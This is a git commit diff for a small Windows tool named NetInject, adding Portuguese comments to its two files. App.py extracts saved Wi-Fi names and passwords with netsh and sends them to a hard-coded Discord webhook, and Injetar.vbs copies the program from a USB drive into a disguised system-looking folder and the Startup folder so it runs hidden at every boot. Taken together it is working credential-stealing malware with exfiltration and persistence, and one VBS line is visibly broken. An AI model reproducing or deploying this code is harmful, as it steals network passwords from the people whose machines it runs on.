0e8dc22c1d0099876c32b8825a872ae8199f67f6
Yuri Luis <71914185+yuriluisz@users.noreply.github.com>
2023-09-11 14:35:46 -0300

    Comments

--- App.py
+++ App.py
@@ -2,6 +2,8 @@ import subprocess
 import datetime
 from discord_webhook import DiscordWebhook
 
+# Pega a senha do wifi atraves do comando "netsh wlan show profiles" e formata pra mostrar apenas nomes e senhas das redes.
+
 def get_networks():
     information_command = subprocess.check_output("netsh wlan show profiles", encoding="cp858", shell=True)
     networks = []
@@ -24,13 +26,23 @@ def information_network(wifi):
             break
     return network
 
+# Informa o dia e a hora que as informações foram coletadas.
+
 dia = datetime.datetime.now()
+
+# Salva as informações coletadas em um arquivo .txt.
+# O motivo de salvar esse arquivo é pelo fato de que o webhook nao recebe informações do tipo funcion...
+# ou seja pra informação chegar correta no webhook e necessario que a informação esteja em formato string.
 
 with open ("Appsaves.txt", "w") as arquivos:
     arquivos.write("As senhas do dia sao: {} // {} ".format(get_networks(),dia))
 
+# Pega as informações do arquivo .txt ja transformada em string prontas para serem enviadas para o webhook.
+
 with open ("Appsaves.txt", "r") as senhasgamers:
     NetInject = senhasgamers.read()
+    
+# Integração webhook com o discord.
 
 webhook = DiscordWebhook(url="https://discordapp.com/api/webhooks/1150539523663605882/Z_AezEKC5gYw_TCE20canPY0qygZGIRYS4ia0EeATCZJwOoWtoARNdv-MFfUWqlVpNON", content="{}".format(NetInject))
 response = webhook.execute()
--- Injetar.vbs
+++ Injetar.vbs
@@ -1,15 +1,30 @@
+'Esse codigo serve para organizar e esconder todos os arquivos do NetInject
+
+' Aqui as fuções crt e stpath sao definidas como variaveis
 Dim crt
 Dim stpath
+
+' Aqui são criadas todas as funções
 set txt = CreateObject(WScript.)
 set crt = CreateObject("wscript.shell")
 set x = CreateObject("Scripting.FileSystemObject")
 set exe = CreateObject("Shell.Application")
+
+' Aqui o script busca encontrar o diretorio da pasta Startup(pasta onde fica os arquivos que iniciam junto do windows)
 set stpath = crt.SpecialFolders("Startup")
 crt.Replace(stpath,"Startup","Startup\")
+
+' Cria o diretorio onde o arquivo original ficara escondido
 crt.Run "cmd /c mkdir c:\SysFunctions\Functionx32"
 WScript.Sleep(400)
+
+' Move os arquivos do pendrive para a pasta dedicada ao programa.
 x.CopyFile "D:\netinject\App.exe", "C:\SysFunctions\Functionx32\"
 x.CopyFile "D:\netinject\Appsaves.txt", "C:\SysFunctions\Functionx32\"
+
+' Move o atalho do executavel para a pasta Startup.
 x.CopyFile "C:\SysFunctions\Functionx32\App.exe", stpath
 WScript.Sleep(400)
+' Executa o programa.
 exe.ShellExecute("C:\SysFunctions\Functionx32\pica.bat")
+
